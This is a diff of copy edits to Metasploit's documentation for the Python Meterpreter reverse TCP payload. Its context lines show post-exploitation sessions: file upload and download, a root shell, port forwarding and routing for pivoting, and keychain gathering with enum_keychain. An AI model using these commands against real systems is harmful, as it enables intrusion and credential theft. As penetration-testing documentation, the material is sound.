@@ -10,14 +10,15 @@ for all of them.
 ## Vulnerable Application
 
 The Python Meterpreter is suitable for any systems that support Python. Some operating
-systems such as Ubuntu, Debian, Arch Linux, and OS X have it by default.
+systems such as Ubuntu, Debian, Arch Linux, and OS X have it by default. The Python
+Meterpreter supports the CPython implementation versions 2.5-2.7 and 3.1+.
 
 ## Deploying python/meterpreter/reverse_tcp
 
 python/meterpreter/reverse_tcp is typically used in two different ways.
 
 First, it can be used with an exploit as long as the Python platform is supported. This sort
-of information usually can be found when you use the ```info``` command like this:
+of information can usually be found when you use the ```info``` command like this:
 
 ```
 msf exploit(ms14_064_packager_python) > info
@@ -53,7 +54,7 @@ want to do this with msfvenom, like this:
 
 ## Important Basic Commands
 
-Compare to a native Meterpreter such as windows/meterpreter/reverse_tcp, the Python Meterpreter
+Compared to a native Meterpreter such as windows/meterpreter/reverse_tcp, the Python Meterpreter
 has less commands, but here's a list of all the common ones you might need:
 
 **pwd command**
@@ -92,7 +93,7 @@ The ```upload``` command allows you to upload a file to the remote target. For e
 meterpreter > upload /tmp/data.txt /Users/sinn3r/Desktop
 [*] uploading  : /tmp/data.txt -> /Users/sinn3r/Desktop
 [*] uploaded   : /tmp/data.txt -> /Users/sinn3r/Desktop/data.txt
-meterpreter > 
+meterpreter >
 ```
 
 **download command**
@@ -104,7 +105,7 @@ For example:
 meterpreter > download /Users/sinn3r/Desktop/data.txt /tmp/pass.txt
 [*] downloading: /Users/sinn3r/Desktop/data.txt -> /tmp/pass.txt/data.txt
 [*] download   : /Users/sinn3r/Desktop/data.txt -> /tmp/pass.txt/data.txt
-meterpreter > 
+meterpreter >
 ```
 
 **search command**
@@ -159,7 +160,7 @@ For example:
 meterpreter > shell
 Process 74513 created.
 Channel 2 created.
-sh-3.2# 
+sh-3.2#
 ```
 
 If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel.
@@ -184,13 +185,13 @@ To use a post module from the Meterpreter prompt, simply use the ```run``` comma
 is an example of collecting OS X keychain information using the enum_keychain post module:
 
 ```
-meterpreter > run post/osx/gather/enum_keychain 
+meterpreter > run post/osx/gather/enum_keychain
 
 [*] The following keychains for root were found:
     "/Users/sinn3r/Library/Keychains/login.keychain"
     "/Library/Keychains/System.keychain"
 [+] 192.168.1.209:58023 - Keychain information saved in /Users/sinn3r/.msf4/loot/20160705211412_http_192.168.1.209_macosx.keychain._271980.txt
-meterpreter > 
+meterpreter >
 ```
 
 ## Using the Post Exploitation API in IRB
@@ -202,7 +203,7 @@ meterpreter > irb
 [*] Starting IRB shell
 [*] The 'client' variable holds the meterpreter client
 
->> 
+>>
 ```
 
 **The client object**
@@ -272,7 +273,7 @@ Step 3: Upload the native via the Python Meterpreter session:
 meterpreter > upload /tmp/native.exe C:\\Users\\sinn3r\\Desktop
 [*] uploading  : /tmp/native.exe -> C:\Users\sinn3r\Desktop
 [*] uploaded   : /tmp/native.exe -> C:\Users\sinn3r\Desktop\native.exe
-meterpreter > 
+meterpreter >
 ```
 
 Step 4: Execute the native payload:
@@ -297,7 +298,7 @@ System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/win32
-meterpreter > 
+meterpreter >
 ```
 
 **Example 2: Using exploit/multi/script/web_delivery**
@@ -312,7 +313,7 @@ cannot talk to the SMB service remotely on the compromised host because it is fi
 you can use portfwd to establish that tunnel:
 
 ```
-meterpreter > portfwd add -l 445 -p 445 -r 192.168.1.220 
+meterpreter > portfwd add -l 445 -p 445 -r 192.168.1.220
 [*] Local TCP relay created: :445 <-> 192.168.1.220:445
 meterpreter > portfwd
 
@@ -345,7 +346,7 @@ To do that, first off, look at the ifconfig/ipconfig output and determine your p
 meterpreter > ipconfig
 ```
 
-Make sure you know the subnet, netmask, and the Meterpreter/session ID. Back to the msf prompt,
+Make sure you know the subnet, netmask, and the Meterpreter/session ID. Return to the msf prompt,
 and establish that route:
 
 ```
